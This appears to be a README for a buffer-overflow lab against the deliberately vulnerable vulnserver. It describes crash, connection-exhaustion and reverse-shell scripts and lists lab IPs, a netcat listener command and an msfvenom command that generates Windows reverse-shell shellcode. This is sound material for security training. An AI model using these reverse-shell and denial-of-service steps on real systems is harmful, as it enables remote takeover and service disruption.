## Test setting
- Local host: 10.0.2.8
- Victim host: 10.0.2.7
 
## DoS.py
This attack exploits the buffer overflow issue of vulnserver and sends a long message, which causes buffer overflow and crash of vulnserver.

## DDoS.py
Since vulnserver allows only a limited number of connections, this attack creates a lot of connections to vulnserver so that no more new connections can be created and no new user can use vulnserver for chatting.

## reverse-shell.py
This attacks ubtilizes the buffer overflow vulnerability of vulnserver and sends a reverse tcp shell payload, which connects back to the attack and spawns a shell at the attacker.
To receive the reverse shell, run the following command at another terminal
```
nc -l -v -p 4444
```

### Notes
1. If the test setting above is used, the python attacking code works directly with no need of change.
2. If the address of *jmp esp* comes from essfunc.dll as used in the example Python code, essfunc.dll does not use ASLR and there is no need of changing the address of *jmp esp* when Windows 10 reboots.
3. If the ip of the local host (attacker's computer) is 10.0.2.8, no need of generating the shellcode using the following command
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.8 LPORT=4444 EXITFUNC=thread -f python -v SHELL -b '\x00\x0a\x0a' 
```
